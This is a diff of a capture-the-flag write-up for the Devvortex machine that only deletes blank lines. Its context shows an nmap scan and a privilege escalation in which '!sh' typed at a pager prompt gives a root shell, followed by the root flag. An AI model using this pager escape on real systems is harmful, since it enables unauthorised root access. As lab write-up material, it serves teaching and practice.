@@ -20,7 +20,6 @@ Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Sun Nov 26 20:17:55 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 devvortex.htb
 Nmap scan report for devvortex.htb (10.129.37.111)
 Host is up, received user-set (0.21s latency).
@@ -44,7 +43,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun Nov 26 20:18:10 2023 -- 1 IP address (1 host up) scanned in 14.99 seconds
 ```
 
@@ -572,10 +570,8 @@ What would you like to do? Your options are:
   C: Cancel
 Please choose (S/V/K/I/C):V
 !sh
-
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
 # cat /root/root.txt
 70207dc9bc1179e4968031af5a7177c8
 ```
@@ -620,7 +616,6 @@ What would you like to do? Your options are:
 Please choose (S/V/K/I/C): V
 [...]
 !sh
-
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
